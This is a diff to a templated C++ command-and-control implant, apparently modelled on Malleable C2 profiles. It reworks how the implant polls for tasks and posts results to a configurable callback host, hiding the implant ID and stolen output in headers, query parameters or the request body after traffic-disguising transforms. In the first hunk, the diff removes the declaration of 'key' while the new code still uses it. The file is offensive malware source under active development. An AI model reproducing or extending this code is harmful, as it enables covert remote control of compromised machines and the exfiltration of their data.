@@ -75,9 +75,16 @@ nlohmann::json get(std::string implant_uuid) {
     [#(e.g., /search?q=BASE64...)#]
     [%- if http_get_client_metadata_terminator == "parameter" %]
     {
-        std::wstring key = L"[[ http_get_client_metadata_terminator_value ]]";
-        //append ?=metadata
-        uri += L"?" + key + L"=" + w_metadata;
+        // Append '?' or '&' depending on existing query string
+        if (uri.find(L'?') != std::wstring::npos) {
+            uri += L"&";
+        } else {
+            uri += L"?";
+        }
+
+        uri += key;
+        uri += L"=";
+        uri += w_metadata;
     }
     [%- endif %]
 
@@ -128,58 +135,76 @@ nlohmann::json get(std::string implant_uuid) {
 
 int post(std::string implant_uuid, std::string output_data, std::string task_uuid) {
 
-    // Turn output data into msgpack
+    // 1. Prepare Payload
     std::vector<uint8_t> task_response_msgpack;
     create_task_response(implant_uuid, task_uuid, output_data, task_response_msgpack);
-
-    // Hold bytes in string, as all the transforms want a string
     std::string payload(task_response_msgpack.begin(), task_response_msgpack.end());
 
-    // --- Transforms ---
-    //borked jinja stuff - deal with later to get id in 
-    // transform id
-    [# Passing 'payload' as the variable name #]
+    // 2. Apply Transforms (ID and Output)
     [%- for transform in http_post_client_id_transforms_list %]
-    [[ render_transform(transform, 'payload') ]]
+    [[ render_transform(transform, 'payload') ]] // Note: This usually transforms the ID specifically if separated, be careful transforming the whole payload twice
     [%- endfor %]
 
-    // transform payload
-    [# Transform Output #]
     [%- for transform in http_post_client_output_transforms_list %]
     [[ render_transform(transform, 'payload') ]]
     [%- endfor %]
-    // --- End Transforms ---
 
+    // 3. Prepare Transport Variables
+    std::wstring w_payload(payload.begin(), payload.end());
+    std::wstring w_id(implant_uuid.begin(), implant_uuid.end());
+    
     std::vector<std::wstring> headers;
+    std::wstring uri = L"[[ http_post_uri ]]";
+    std::string final_post_body = ""; 
 
-    [# IF MC2 says it wants a header for storing the ID... #]
+    // 4. Handle Client ID Placement
     [%- if http_post_client_id_terminator == "header" %]
-    headers.push_back(L"[[ http_post_client_id_terminator_value ]]: " + std::wstring(implant_uuid.begin(), implant_uuid.end()));
+        headers.push_back(L"[[ http_post_client_id_terminator_value ]]: " + w_id);
     [%- endif %]
 
-    [# IF MC2 says it wants a parameter for storing the ID... #]
     [%- if http_post_client_id_terminator == "parameter" %]
-    // TODO: Implement parameter logic
+        if (uri.find(L'?') != std::wstring::npos) {
+            // URI already has query parameters
+            uri += L"&";
+        } else {
+            // First query parameter
+            uri += L"?";
+        }
+        uri += L"[[ http_post_client_id_terminator_value ]]=" + w_id;
     [%- endif %]
+    
+    //I don't think this is a valid case for malleablec2, id can't go in body iirc
+    //Can easily change with this if not the case. 
+    //[%- if http_post_client_id_terminator == "print" %]
+    //    // Rare: ID is appended to body. Usually prepended to final_post_body
+    //    final_post_body += implant_uuid; 
+    //[%- endif %]
 
-    [# IF MC2 says it wants a header for storing the output... #]
+    //Need to check if ID is allowed in URI
+
+    // 5. Handle Output Placement
     [%- if http_post_client_output_terminator == "header" %]
-    headers.push_back(L"[[ http_post_client_output_terminator_value ]]: " + std::wstring(payload.begin(), payload.end()));
-    
-    // This specific profile, no data in body. It's stored in utmcc
-    std::string payload_string = "";
-    [%- endif %]
-    
-    [# IF MC2 says it wants to store the output in the body #]
-    [%- if http_post_client_output_terminator == "print" %]
-    std::string payload_string = payload;
+        headers.push_back(L"[[ http_post_client_output_terminator_value ]]: " + w_payload);
     [%- endif %]
 
-    // Send
-    std::string http_post_response_buffer;
-    if (!HTTP_POST(payload_string, headers, http_post_response_buffer)) {
-        std::cout << "Error occured posting data";
-    };
+    [%- if http_post_client_output_terminator == "print" %]
+        final_post_body += payload;
+    [%- endif %]
+    
+    [%- if http_post_client_output_terminator == "parameter" %]
+        // This is dangerous for large output, but Malleable C2 allows it
+        std::wstring w_body_param(payload.begin(), payload.end());
+        if (uri.find(L"?") != std::wstring::npos) uri += L"&"; else uri += L"?";
+        uri += L"[[ http_post_client_output_terminator_value ]]=" + w_body_param;
+    [%- endif %]
+
+    // 6. Send
+    std::string response_buffer;
+    // We pass the calculated URI and the constructed Body
+    if (!HTTP_POST(L"[[callback_host]]", [[callback_port]], L"[[http_post_verb]]", uri, headers, final_post_body, response_buffer)) {
+        std::cerr << "Error posting data" << std::endl;
+        return 1;
+    }
     
     return 0;
 }
